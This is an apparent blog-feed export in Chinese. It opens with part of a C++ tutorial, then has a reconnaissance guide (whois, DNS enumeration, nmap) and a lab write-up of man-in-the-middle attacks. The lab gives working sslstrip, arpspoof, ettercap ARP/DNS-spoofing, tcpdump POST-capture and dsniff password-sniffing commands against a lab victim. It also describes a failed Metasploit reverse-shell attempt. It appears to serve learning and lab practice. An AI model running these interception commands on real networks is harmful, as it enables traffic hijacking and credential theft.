i) &#123; cout &lt;&lt; "正数为： " &lt;&lt; i &lt;&lt; endl; &#125; void print(double f) &#123; cout &lt;&lt; "浮点数为：" &lt;&lt; f &lt;&lt; endl; &#125;&#125;;int main(void)&#123; printData pd; pd.print(5); pd.print(5.5); return 0;&#125; 运算符重载： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;iostream&gt;using namespace std; class Box&#123; public: double getVolume(void) &#123; return length * breadth * height; &#125; void setLength( double len ) &#123; length = len; &#125; void setBreadth( double bre ) &#123; breadth = bre; &#125; void setHeight( double hei ) &#123; height = hei; &#125; //重载 Box operator+(const Box&amp; b) &#123; Box box; box.length = this-&gt;length + b.length; box.breadth = this-&gt;breadth + b.breadth; box.height = this-&gt;height + b.height; return box; &#125; private: double length; double breadth; double height;&#125;;int main( )&#123; Box Box1; Box Box2; Box Box3; double volume = 0.0; Box1.setLength(6.0); Box1.setBreadth(7.0); Box1.setHeight(5.0); Box2.setLength(12.0); Box2.setBreadth(13.0); Box2.setHeight(10.0); volume = Box1.getVolume(); cout &lt;&lt; "Volume of Box1 : " &lt;&lt; volume &lt;&lt;endl; volume = Box2.getVolume(); cout &lt;&lt; "Volume of Box2 : " &lt;&lt; volume &lt;&lt;endl; Box3 = Box1 + Box2; volume = Box3.getVolume(); cout &lt;&lt; "Volume of Box3 : " &lt;&lt; volume &lt;&lt;endl; return 0;&#125; 1234$ ./a.out Volume of Box1 : 210Volume of Box2 : 1560Volume of Box3 : 5400 不可重载的运算符： .成员访问运算符 .和-&gt;\成员指针访问运算符 ::域运算符 sizeof长度运算符 ?条件运算符 *预处理运算符 多态12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt; using namespace std; class Shape &#123; protected: int width, height; public: Shape( int a=0, int b=0) &#123; width = a; height = b; &#125; int area() &#123; cout &lt;&lt; "Parent class area :" &lt;&lt;endl; return 0; &#125;&#125;;class Rectangle: public Shape&#123; public: Rectangle( int a=0, int b=0):Shape(a, b) &#123; &#125; int area () &#123; cout &lt;&lt; "Rectangle class area :" &lt;&lt;endl; return (width * height); &#125;&#125;;class Triangle: public Shape&#123; public: Triangle( int a=0, int b=0):Shape(a, b) &#123; &#125; int area () &#123; cout &lt;&lt; "Triangle class area :" &lt;&lt;endl; return (width * height / 2); &#125;&#125;;int main( )&#123; Shape *shape; Rectangle rec(10,7); Triangle tri(10,5); // 存储矩形的地址 shape = &amp;rec; // 调用矩形的求面积函数 area shape-&gt;area(); // 存储三角形的地址 shape = &amp;tri; // 调用三角形的求面积函数 area shape-&gt;area(); return 0;&#125; 输出结果为： 12Parent class areaParent class area 与预期的不一样，这是因为静态多态，在area()的声明前加上关键字virtual就行，此时这个函数会变成虚函数，虚函数必须实现，否则会报错。当不能对虚函数给出有意义的实现时，可以用纯虚函数 1234567891011class Shape&#123; protected: int width, height; public: Shape(int a=0, int b=0) &#123; width = a; heihgt = b; &#125; virtual int area() = 0;&#125; =0告诉编译器函数没有主体，上面的函数是纯虚函数 高级进阶文件流文件读取流和写入流用到了fstream标准库，其定义了三个新的数据类型 ofstream 表示输出文件流，用于创建文件并向文件写入内容 ifstream 表述输入文件流，用于从文件读取内容 fstream 表示文件流，包含以上两种功能 打开文件： 在对文件进行操作之前需要先打开文件，ofstream和fstream对象都可以打开文件进行写操作。 open()函数是以上三个对象的一个成员，其标准语法为： 1void open(const char *filename, ios::openmode mode); 第一个参数是打开文件的名称和位置，第二个参数是定义文件被打开的模式 iOS::app 追加模式，内容写到文件末尾 ios::ate 文件打开后定位到文件末尾 iOS::in 打开文件用于读取 iOS::out 打开文件同于写入 iOS::trunc 如果该文件已经存在，其内容将在打开文件之前被截断，文件长度变为0 以上模式可以结合使用，例如想以写入模式打开文件并希截断文件，以防文件已经存在，可以用以下代码： 12ofstream outfile;outfile.open("1.txt", ios::out | ios::trunc); 想打开一个文件用于读写: 12fstream afile;afile.open("1.txt", ios::out | ios::in); 关闭文件： 和open()成员类似，关闭文件用close() 写入文件： 用流插入运算符&lt;&lt;向文件写入内容，就像输出到屏幕上一样，不过这里用的是ofstream或fstream对象，输出是cout对象 读取文件： 和写入文件类似，这里用&gt;&gt;运算符 实例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; char data[100]; //以写模式打开文件 ofstream outfile; outfile.open("1.txt"); cout &lt;&lt; "写入文件" &lt;&lt; endl; cout &lt;&lt; "输入你的名字："; cin.getline(data, 100); //从外部读取一行，是cin对象的附加对象 //向文件中写入用户输入的数据 outfile &lt;&lt; data &lt;&lt; endl; cout &lt;&lt; "输入你的年龄："; cin &gt;&gt; data; cin.ignore(); //忽略掉之前读语句留下的多余字符 //再次向文件写入用户输入的数据 outfile &lt;&lt; data &lt;&lt; endl; //关闭打开的文件 outfile.close(); //以读模式打开文件 ifstream infile; infile.open("1.txt"); cout &lt;&lt; "从文件中读取内容：" &lt;&lt; endl; infile &gt;&gt; data; //在屏幕上写入数据 cout &lt;&lt; data &lt;&lt; endl; //再次从文件读取数据并显示到屏幕上 infile &gt;&gt; data; cout &lt;&lt; data &lt;&lt; endl; //关闭文件 infile.close(); return 0;&#125; 1234567$ ./a.out 写入文件输入你的名字：67输入你的年龄：67从文件中读取内容：6767 文件位置指针： 重新定位文件的位置指针的成员函数包括istream的seekg和ostream的seekp，他们的参数通常为一个长整型。第二个参数可以用于指定查找方向，方向可以是ios::beg（默认，从流的开头开始定位），也可以是ios::cur（从流的位置开始定位），也开始ios::end（从流的末尾开始定位） 定位get文件位置指针的例子： 1234567891011//定位到fileObject的第n个字节（假设是ios::beg）fileObject.seekg(n);//把文件的读指针从fileObject当前位置向后移n个字节fileObject.seekg(n, ios::cur);//把文件的读指针从fileObject末尾往后移n个字节fileObject.seekg(n, ios::end);//定位到fileObject的末尾fileObject.seekg(0, ios::end); 异常和java的异常处理类似，直接看例子 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;double division(int a, int b)&#123; if(b == 0) &#123; throw "error!"; &#125; return (a/b);&#125;int main()&#123; int x = 50; int y = 0; double z = 0; try&#123; z = division(x, y); cout &lt;&lt; z &lt;&lt; endl; &#125;catch(const char *msg)&#123; cerr &lt;&lt; msg &lt;&lt; endl; &#125; return 0;&#125; 由于抛出了一个类型为const char的异常，因此捕获该异常时，必须在catch块中使用const char\ 12$ ./a.out error! 自定义异常 可以通过继承和重载exception类来定义新的异常 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;exception&gt;using namespace std;struct MyException : public exception&#123; const char * what() const throw() &#123; return "error!"; &#125;&#125;;int main()&#123; try &#123; throw MyException(); &#125; catch(MyException&amp; e) &#123; std::cout &lt;&lt; "自定义异常捕获" &lt;&lt; std::endl; std::cout &lt;&lt; e.what() &lt;&lt; std::endl; &#125;&#125; 123$ ./a.out 自定义异常捕获error! 动态内存c++中的内存分为两个部分： 栈：在函数内部声明的所有变都将占用栈内存 堆：程序中未使用的内存，在程序运行时可用于动态分配内存 可以用new运算符来动态分配内存，如果不需要动态分配内存可以用delete运算符删除之前由new运算符分配的内存 例如可以定义一个指向double类型的指针，然后请求内存，该内存在执行时被分配： 12double *pvalue = NULL;pvalue = new double; 如果自由存储区已经用完，就会出现无法分配内存的问题，所以可以使用一个if语句进行检查 123456double* pvalue = NULL;if(!(pvalue = new double))&#123; cout &lt;&lt; "error!" &lt;&lt; endl; exit(1);&#125; new和c语言里的malloc()类似，但是一般使用new，因为new不知分配了内存，还创建了对象。 释放内存： 1delete pvalue; 实例： 123456789101112131415#include &lt;iostream&gt;using namespace std;int main()&#123; double* pvalue = NULL; pvalue = new double; *pvalue = 123.123 cout &lt;&lt; "值为：" &lt;&lt; *pvalue &lt;&lt; endl; delete pvalue; return 0;&#125; 数组的动态内存分配也类似： 1234char* pvalue = NULL;pvalue = new char[20];delete [] pvalue; 二维及以上的数组释放内存时使用循环第一维就行 对象的动态内存分配： 123456789101112131415161718192021#include &lt;iostream&gt;using namespace std;class Box&#123; public: Box()&#123; cout &lt;&lt; "调用构造函数" &lt;&lt; endl; &#125; ~Box()&#123; cout &lt;&lt; "调用析构函数" &lt;&lt; endl; &#125;&#125;;int main()&#123; Box* myBoxArray = new Box[4]; delete [] myBoxArray; return 0;&#125; 123456789$ ./a.out 调用构造函数调用构造函数调用构造函数调用构造函数调用析构函数调用析构函数调用析构函数调用析构函数 命名空间有时可能会在不同的库中定义相同的函数名，为了不引起混淆，需要定义一个命名空间 例子： 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;//第一个命名空间namespace first_space&#123; void func()&#123; cout &lt;&lt; "first_space" &lt;&lt; endl; &#125;&#125;//第二个命名空间namespace second_space&#123; void func()&#123; cout &lt;&lt; "second_space" &lt;&lt; endl; &#125;&#125;int main()&#123; first_space::func(); second_space::func(); return 0;&#125; using指令： 使用using namespace命令，就可以在使用命名空间时不用在前面加上命名空间的名称 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;//第一个命名空间namespace first_space&#123; void func()&#123; cout &lt;&lt; "first_space" &lt;&lt; endl; &#125;&#125;//第二个命名空间namespace second_space&#123; void func()&#123; cout &lt;&lt; "second_space" &lt;&lt; endl; &#125;&#125;using namespace first_space;int main()&#123; func(); return 0;&#125; 命名空间还可以嵌套使用，例如空间1里包含空间2，访问时的格式为using namespace 空间1::空间2 预处理器#define预处理： 定义一个常量，也可以定义一个带有参数的宏，如： 1#define MIN(a, b) (a &lt; b ? a : b) 条件编译： 可以用指令来有选择的对部分源代码进行编译，条件预处理器的机构和if类似： 123#ifndef NULL #define NULL 0#endif 可以只在调试时进行编译，调试开关可以使用一个宏来实现： 123#ifdef DEBUG cerr &lt;&lt; "x的值为：" &lt;&lt; x &lt;&lt; endl;#endif 如果在指令#ifdef DEBUG之前已经定义了符号常量DEBUG，则只会对程序中的cerr语句进行编译。还可以用#if 0语句注释掉一部分： 123#if 0 不进行编译的代码#endif 预定义宏： _LINE\_ 这会在程序编译时包含当前行号 _FILE\_ 这会在程序编译时包含当前文件名 __DATE__ 这会包含一个形式为month/day/year的字符串，它表示把源文件转换为目标代码的日期 _TIME\_ 这会包含一个形式为hour:minute:second的字符串，它表示程序被编译的时间 12345678910111213#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; "__LINE__的值为：" &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "__FILE__的值为：" &lt;&lt; __FILE__ &lt;&lt; endl; cout &lt;&lt; "__DATE__的值为：" &lt;&lt; __DATE__ &lt;&lt; endl; cout &lt;&lt; "__TIME__的值为：" &lt;&lt; __TIME__ &lt;&lt; endl; return 0;&#125; 运行结果为： 12345$ ./a.out __LINE__的值为：7__FILE__的值为：1.cpp__DATE__的值为：Feb 28 2018__TIME__的值为：00:14:08 信号处理信号是由操作系统传给进程的操作，例如ctrl+c的中断操作。有些信号不能被程序捕获，下列信号可以被捕获（头文件为：csignal） SIGABRT 程序的异常终止，例如调用abort SIGFPE 错误的算术运算，例如处以0或导致溢出的操作 SIGILL 检测非法指令 SIGINT 接收到交互注意信号 SIGSEGV 非法访问内存 SIGTERM 发送到程序的终止请求 signal()函数： 用来捕获突发事件，语法为： 1void (*signal (int sig, void (*func)(int)))(int); 第一个参数为一个整数，代表了信号的编号。第二个参数是一个指向信号处理函数的指针。 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;csignal&gt;#include &lt;unistd.h&gt;using namespace std;void signalHandler(int signum)&#123; cout &lt;&lt; "捕获信号 (" &lt;&lt; signum &lt;&lt; ") .\n"; exit(signum);&#125;int main()&#123; signal(SIGINT, signalHandler); while(1)&#123; cout &lt;&lt; "waiting...." &lt;&lt; endl; sleep(1); &#125; return 0;&#125; 123456$ ./a.out waiting....waiting....waiting....waiting....^C捕获信号 (2) . raise()函数： 可以使用raise()函数生成信号，此函数带有一个整数信号编号作为参数 1int raise(signal sig); 例子： 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;csignal&gt;#include &lt;unistd.h&gt;using namespace std;void signalHandler(int signum)&#123; cout &lt;&lt; "捕获信号("&lt;&lt; signum &lt;&lt;").\n"; exit(signum);&#125;int main()&#123; int i = 0; //注册新号SIGINT和新号处理程序 signal(SIGINT, signalHandler); while(++i)&#123; cout &lt;&lt; "waiting...." &lt;&lt; endl; if(i == 3)&#123; raise(SIGINT); &#125; sleep(1); &#125; return 0;&#125; 12345$ ./a.out waiting....waiting....waiting....捕获信号(2). 多线程多任务处理分两种类型： 基于进程：程序的并发执行 基于线程：同一程序的片段的并发执行 创建线程： 创建一个POSIX线程： 12#include &lt;pthread.h&gt;pthread_creat (thread, attr, start_routine, arg); 参数说明： thread:指向线程标示指针attr:一个不透明的属性对象，可以被用来设置线程数行，可以指定线程对象，也可以使用默认值NULLstart_routine:线程运行函数起始地址，一旦线程被创建就会执行arg:运行函数的参数。必须通过把引用作为指针强制转换为void类型进行传递。如果没有传递参数，就使用NULL 终止线程： 终止一个POSIX线程： 12#include &lt;pthread.h&gt;pthread_exit(status); pthread_exit用于显式的退出一个线程。通常情况下，pthread_exit()函数是在线程完成工作后无需继续存在时被调用 如果main函数在它所创建的线程之前结束，并通过pthread_exit()退出，那么其他线程将继续执行。否则他们将在main函数结束时自动被终止 例子1： 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;pthread.h&gt;using namespace std;#define NUM_THREADS 5void* say_hello(void* args)&#123; cout &lt;&lt; "hello world" &lt;&lt; endl; return 0;&#125;int main()&#123; pthread_t tids[NUM_THREADS]; for(int i = 0; i &lt; NUM_THREADS; ++i) &#123; //创建的线程id，线程参数，调用的函数，传入的函数参数 int ret = pthread_create(&amp;tids[i], NULL, say_hello, NULL); if(ret != 0) &#123; cout &lt;&lt; "线程创建失败，失败原因：" &lt;&lt; ret &lt;&lt; endl; &#125; &#125; //等各个线程退出后进程才结束，否则进程强制结束线程可能反应不过来 pthread_exit(NULL);&#125; 使用pthread_creat()函数创建了五个线程，每个线程输出hello world 使用-lpthread库编译程序： 1$ g++ 1.cpp -lpthread -o 1.o 123456$ ./1.o hello world.hello world.hello world.hello world.hello world. 例子2： 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;pthread.h&gt;using namespace std;#define NUM_THREADS 5void *PrintHello(void *threadid)&#123; //对传入的参数进行强制转换，由无类型指针变为整形数指针，然后再读取 int tid = *((int*)threadid); cout &lt;&lt; "hello 线程：" &lt;&lt; tid &lt;&lt; endl; pthread_exit(NULL);&#125;int main()&#123; pthread_t threads[NUM_THREADS]; int indexes[NUM_THREADS]; //用数组保存i的值 int rc, i; for(i = 0; i &lt; NUM_THREADS; i++)&#123; cout &lt;&lt; "main():创建线程：" &lt;&lt; i &lt;&lt; endl; indexes[i] = i; //先保存i的值 //传入的时候必须强制转换为void*类型，即无类型指针 rc = pthread_create(&amp;threads[i], NULL, PrintHello, (void*)&amp;(indexes[i])); if(rc)&#123; cout &lt;&lt; "无法创建线程" &lt;&lt; rc &lt;&lt; endl; exit(-1); &#125; &#125; pthread_exit(NULL);&#125; 使用pthread_create函数创建了五个线程，并接受传入的参数，每隔线程打印一个hello，并输出接受的参数，然后调用pthread_exit()终止线程 1234567891011$ ./a.out main() : 创建线程, 0main() : 创建线程, 1main() : 创建线程, 2main() : 创建线程, 3Hello 线程： 0main() : 创建线程, 4Hello 线程： 1Hello 线程： 2Hello 线程： 3Hello 线程： 4 例子3: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;pthread.h&gt; using namespace std; #define NUM_THREADS 5 struct thread_data&#123; int thread_id; char *message;&#125;; void *PrintHello(void *threadarg)&#123; struct thread_data *my_data; my_data = (struct thread_data *) threadarg; cout &lt;&lt; "Thread ID : " &lt;&lt; my_data-&gt;thread_id ; cout &lt;&lt; " Message : " &lt;&lt; my_data-&gt;message &lt;&lt; endl; pthread_exit(NULL);&#125; int main ()&#123; pthread_t threads[NUM_THREADS]; struct thread_data td[NUM_THREADS]; int rc; int i; for( i=0; i &lt; NUM_THREADS; i++ )&#123; cout &lt;&lt;"main() : creating thread, " &lt;&lt; i &lt;&lt; endl; td[i].thread_id = i; td[i].message = (char*)"This is message"; rc = pthread_create(&amp;threads[i], NULL, PrintHello, (void *)&amp;td[i]); if (rc)&#123; cout &lt;&lt; "Error:unable to create thread," &lt;&lt; rc &lt;&lt; endl; exit(-1); &#125; &#125; pthread_exit(NULL);&#125; 通过结构传递多个参数，可以在线程回掉中传递任意的数据类型，因为其指向void 1234567891011$ ./a.out main() : creating thread, 0main() : creating thread, 1Thread ID : main() : creating thread, 02 Message : Thread ID : This is message1 Message : This is messagemain() : creating thread, Thread ID : 32 Message : This is messagemain() : creating thread, 4Thread ID : 3 Message : This is messageThread ID : 4 Message : This is message 连接和分离线程： 可以使用以下两个函数来连接或分离线程 12pthread_join(threadid, status)pthread_detach(threadid) pthread_join() 子程序阻碍调用程序，直到指定的 threadid 线程终止为止。当创建一个线程时，它的某个属性会定义它是否是可连接的（joinable）或可分离的（detached）。只有创建时定义为可连接的线程才可以被连接。如果线程创建时被定义为可分离的，则它永远也不能被连接。 例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt; using namespace std; #define NUM_THREADS 5 void *wait(void *t)&#123; int i; long tid; tid = (long)t; sleep(1); cout &lt;&lt; "Sleeping in thread " &lt;&lt; endl; cout &lt;&lt; "Thread with id : " &lt;&lt; tid &lt;&lt; " ...exiting " &lt;&lt; endl; pthread_exit(NULL);&#125; int main ()&#123; int rc; int i; pthread_t threads[NUM_THREADS]; pthread_attr_t attr; void *status; // 初始化并设置线程为可连接的（joinable） pthread_attr_init(&amp;attr); pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE); for( i=0; i &lt; NUM_THREADS; i++ )&#123; cout &lt;&lt; "main() : creating thread, " &lt;&lt; i &lt;&lt; endl; rc = pthread_create(&amp;threads[i], NULL, wait, (void *)&amp;i ); if (rc)&#123; cout &lt;&lt; "Error:unable to create thread," &lt;&lt; rc &lt;&lt; endl; exit(-1); &#125; &#125; // 删除属性，并等待其他线程 pthread_attr_destroy(&amp;attr); for( i=0; i &lt; NUM_THREADS; i++ )&#123; rc = pthread_join(threads[i], &amp;status); if (rc)&#123; cout &lt;&lt; "Error:unable to join," &lt;&lt; rc &lt;&lt; endl; exit(-1); &#125; cout &lt;&lt; "Main: completed thread id :" &lt;&lt; i ; cout &lt;&lt; " exiting with status :" &lt;&lt; status &lt;&lt; endl; &#125; cout &lt;&lt; "Main: program exiting." &lt;&lt; endl; pthread_exit(NULL);&#125; 用 pthread_join() 函数来等待线程的完成 123456789101112131415161718192021main() : creating thread, 0main() : creating thread, 1main() : creating thread, 2main() : creating thread, 3main() : creating thread, 4Sleeping in thread Thread with id : 4 ...exiting Sleeping in thread Thread with id : 3 ...exiting Sleeping in thread Thread with id : 2 ...exiting Sleeping in thread Thread with id : 1 ...exiting Sleeping in thread Thread with id : 0 ...exiting Main: completed thread id :0 exiting with status :0Main: completed thread id :1 exiting with status :0Main: completed thread id :2 exiting with status :0Main: completed thread id :3 exiting with status :0Main: completed thread id :4 exiting with status :0Main: program exiting. 路还很长]]></content>
      <tags>
        <tag>编程</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集]]></title>
    <url>%2F2018%2F02%2F03%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[信息收集作为渗透测试中很重要的一个环节，应该系统学习一下 DNS信息收集whois查询可以在站长之家查询，例如一下就是对百度的whois查询信息： 可以看到，在whois查询中能得到很多域名信息，包括注册人姓名和邮箱电话信息，这对于测试个人站点还是有比较大的用处，比如可以通过谷歌或者百度挖掘更多注册人的信息，还可以利用这些信息生成爆破字典 当然对于大型网站，DNS服务器信息显得更为重要，大公司一般都有自己的域名服务器，这些服务器可以在测试中发挥重要作用 域名基本信息查询DNS服务器查询： 除whois查询外，还可以通过host命令进行dns服务器查询 如图为利用host命令查询常用的a记录、ns记录和mx记录 host命令语法： 1host 参数 主机（域名或IP） 参数： 12345678910-a：显示详细的DNS信息-c 类型：指定查询类型，默认为IN，另外两个类型几乎不使用-C：查询主机完整的SOA记录-r：在查询域名时，不使用递归的查询方式-t 类型：指定查询的域名信息类型-v：显示命令执行的详细信息-w：如果域名服务器没有应答，就一直等待直到收到应答-W 时间：域名查询的最长时间，超出则退出-4:IPv4-6:IPv6 域名枚举可以利用如下工具来进行域名列表查询： 123fiercednsenumdnsmap 值得注意的是，每个工具返回的查询结果不一定相同，还有可能出错，所以进行枚举的时候可以使用不同工具 fierce： 用法： 1fierce [-dns domain] [options] 常用options：wordlist，加载字典: 1fierce -dns xxx.com -wordlist wordlist.txt output.txt DNSenum： 用法： 1dnsenum [options] domain 常用options： 12345--threads [number]：设置用户同时运行进程数-r：启用递归查询-d：设置whois请求之间的时间延迟秒数-o：指定输出位置-w：启用whois请求 dnsmap： 用法： 1dnsmap domain [options] options: 123-w：加载一个字典文件-c：输出文件-d：设置延迟时间 端口扫描使用nmap进行扫描 1nmap 参数 ip 常用参数： 1234567891011121314-sT:TCP connect（）扫描，这种方式会在目标主机的日志记录中记录大量链接和错误信息-sP:ping扫描，只有主机存活才会继续扫描。但是一般不加这个，因为有主机会禁ping-sS:半开扫描，一般不会记入日志，需要root权限-sU:upd扫描（不可靠）-sA:用来穿过防火墙的规则集，速度较慢-sV:端口服务及版本-A:包含了-sv,-o,全面系统检测，启动脚本检测，扫描等。-P0（数字）:扫描之前不使用ping，适用于防火墙禁ping-v:显示扫描进程-O:探测目标系统的漏洞（易误报）-oN/-oX/-oG:将报告写入文件，格式分别为txt、xml、grepable-iL:扫描主机列表-sC --script=default:默认脚本扫描，主要是搜集各种应用服务信息-p:指定端口 nmap的脚本参数： 脚本很多，可以分为以下几类，扫描时直接用类名进行笼统的扫描： 1234567891011121314auth：绕开鉴权的脚本broadcast：在局域网进行广播，探查更多服务开启状态，如dhcp、dns等brute：暴力破解脚本default：使用-sC或-A选项扫描时默认的脚本，提供基本脚本扫描能力discovery：对网络进行更多信息查询操作，如smb枚举、snmp查询等dos：进行ddos攻击exploit：利用已知漏洞进行攻击external：利用第三方进行whois查询fuzzer：模糊测试脚本，发送异常的包到目标机，探测潜在漏洞intrusive：入侵脚本，这些脚本容易引发ids/ips的记录和屏蔽safe：安全脚本，和上面相反malware：探测主机是否感染病毒或被开启后门version：增强服务和版本扫描vuln：探测主机是否有常见漏洞 系统指纹识别nmap使用nmap的-O选项启动操作系统识别功能 p0fp0f是一款被动指纹识别工具，该工具通过分析目标主机发出的数据包，对主机的操作系统进行识别，有防火墙也能使用。 p0f还可以探测目标主机是否运行于nat模式，是否运行于负载均衡模式，系统已启动时间等 p0f参数： 123456789101112-i interface：指定监听的网络接口-r file：读取由抓包工具抓到的网络数据包文件-p：-L：列出所有可用接口-f file：指定指纹数据库路径，默认为/etc/p0f/p0f。fp-o file：写入指定日志文件-u user：以指定用户身份运行程序，工作目录会切换到当前用户根目录下-d：后台运行-S limit：设置API并发数，默认为20，最大为100-t c，h：设置连接超时时间（30s，120m）-m c，h：设置最大网络连接数和同时追踪的主机数（1000，10000）还可以直接输入命令p0f，然后就会想Wireshark一样抓取流量 利用框架进行信息收集Recon-NG 利用help命令查看帮助： 其他操作和metasploit类似，show option，set，run，素质三连 Maltego先要注册一个账号才能，登录后选择新建项目 然后可以选择很多中模式，我选的footprint l3 接着next，输入目标站点就可以了，系统会自动生成一个可视化的信息图]]></content>
      <tags>
        <tag>信息收集</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[几个常用中间人渗透框架]]></title>
    <url>%2F2018%2F01%2F29%2F%E5%87%A0%E4%B8%AA%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[最近对中间人攻击很着迷啊，有毒 实验环境：123攻击机：kali IP：10.211.55.7目标机：Windows 7 IP：10.211.55.4subterfuge 5.0 subterfuge实验步骤：前期准备1.下载并解压工具subterfuge 5.0 2.安装，安装时需注意，选择python_old.py -i（命令行安装），而不是python install.py -i（图形化安装），否则会报错 3.默认安装路径为：/usr/share/subterfuge，执行./sslstrip.py -h 查看参数，会显示权限不够，给权限就OK 1chmod +x sslstrip.py 4.查看参数 5.开启IP转发 1root@67:/usr/share/subterfuge# echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward 6.用iptables将80端口转发到1234端口，方便sslstrip监听 1root@67:/usr/share/subterfuge# iptables -t nat -A PREROUTING -p tcp --distination-port 80 -j REDIRECT --to-port 1234 开始攻击启动sslstrip开始监听 执行攻击命令 123-A 开启ascii模式，把捕获的数据以ascii默认显示-i 选择监听网卡src 10.211.55.4 and port 80 抓取10.211.55.4的80端口的tcp数据 在目标机上随便进入一个https的网站就能抓取到所有tcp数据 在目标机上登录QQ邮箱，攻击机上能抓取到cookie等请求头信息 ARPspoof再介绍这个框架之前先了解下ARP协议： ARP协议也叫地址解析协议，跟DNS协议类似，只不过ARP协议是用来解析IP和Mac地址的 工作流程： 1.根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址，然后A主机在自己的本地ARP缓存中检查是否匹配B的Mac地址 2.如果主机A在ARP缓存中没有找到映射，它将访问主机B的硬件地址，从而将包含了A的IP和Mac地址的ARP请求广播到本地网络上的所有主机。 3.本地的每台主机都能接收到这个ARP请求，并且同时检查是否匹配。如果匹配则将主机A的IP和Mac地址映射添加到本地ARP缓存中，不匹配则丢弃这个ARP请求。 4.主机B将包含了自身Mac地址的ARP信息回复给A 5.主机A接收到B的回复消息后，会用B的IP和Mac地址更新ARP缓存，并且建立连接。本机缓存是有生存期道德，生存期结束后缓存会被丢弃，这时候会重复上面的步骤再次建立连接 实验步骤：1.开启IP转发，上面提到过，就不赘述了 2.查看下参数： 12root@bt:~# arpspoof -hUsage: arpspoof [-i interface] [-t target] host 3.转发受害者的流量到网关： 1root@67:~# arpspoof -i eth0 -t 10.211.55.4 10.211.55.1 4.转发网关的流量到攻击者： 1root@67:~# arpspoof -i eth0 -t 10.211.55.1 10.211.55.7 5.键入命令开始监听： 1root@67:~# driftnet -i eth0 6.在受害机上打开浏览器搜索图片就能看到攻击效果 Ettercap——ARP中间人攻击Ettercap有很多插件，用途很广： 1234dns_spoof（dns欺骗攻击）Dos_attack（ddos攻击）Chk_poison（检测是否进行了攻击）Repoison_arp（修复arp） ettercap包含四种攻击模式： 1234基于IP：根据IP源的目的地过滤数据包基于Mac：根据Mac地址过滤数据包，能够对嗅探通过网关的连接起作用基于ARP：利用ARP欺骗方式在两个主机之间的交换式局域网上进行嗅探基于公共ARP：利用ARP欺骗方式从一台受害者主机到其他所有主机的交换式局域网上进行嗅探 ettercap还有图形化界面 实验步骤1.查看参数： 1root@67:~# ettercap -h 后能看到很多参数，这里选取几个常用的进行了解： 1234-t 只监听这种协议-T ettercap检查pcap文件（脱机监听）-q 不回显-M 告诉ettercap执行中间人攻击 2.对目标机进行ARP欺骗： 1root@67:~# Ettercap -T -q -M ARP //10.211.55.5/ 3.然后和上面的arpspoof一样，使用driftnet -i eth0命令来接收劫持的流量 如果想保存劫持到的图片，可以用如下命令： 不知道是不是因为白天网络更好还是ettercap更好用，这个劫持的速度更快 Ettercap——DNS中间人攻击：基础演示1.打开ettercap GUI（当然也可以使用命令行），点击“Sniff-&gt;unified sniffing”选择网卡 2.然后点击“hosts-&gt;hosts list”查看子网存活主机 3.编辑etter.dns，将： 修改为另一个网站和自己的ip（因为默认情况下ettercap是重定向到另一个IP，所以需要改变他）： 4.这是需要启用IP转发： 1root@67:~# echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward 此时在被攻击机上可以看到DNS是正常解析的（虽然网络大姨妈ping失败） 5.接着回到ettercap GUI上，选择受害者IP地址及Mac地址，点击“Mitm-&gt;ARP poisoning-&gt;Sniff remote connerctions” 6.然后点击“start-&gt;start sniffing” 7.选择“plugins-&gt;manage the plugins-&gt;dnsspoof”插件来执行DNS中间人欺骗攻击 8.通过ettercap启用DNS欺骗攻击 1234-T 使用文本界面-q 不回显-P 使用插件-M 启动ARP欺骗攻击 此时在受害者机器上看到，已经攻击成功 高级进阶我们还可以利用msf来进行进一步攻击 其中设置的ip是攻击机的IP 然后根据我们的DNS设置etter.dns文件 但是当用受害机访问目标网站的时候，却不能反弹一个shell，一直不断刷新 因为这是基于ms10-046的快捷方式link文件自动执行代码漏洞，索性我直接将生成的URL直接复制到目标机浏览器 可是出现了和前面一样的情况，一直刷新就是不跳转到共享页面并反弹shell，看来是我的虚拟机已经打了补丁 Dsniff&amp;ARP欺骗：1.先进行IP转发以及ARP欺骗，同上 2.然后开启dsniff来捕获已知协议获取密码 12root@67:~# dsniff -i eth0 dsniff:listening o eth0 除了dsniff外，还可以用其他工具来进行不同操作 利用tcpdump捕获相应头 1root@67~# tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 10.211.55.4 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4]=0x504f5354)' 利用driftnet捕获图片 1root@67~# driftnet -i eth0 利用urlsnarf捕获http访问记录（抓到的结果会很乱，可以用-v选项指定过滤规则） 1root@67~# urlsnarf -i eth0 利用dnsspoof进行dns欺骗，可以用来钓鱼或挂马??? 1root@67~# dnsspoof -i eth0 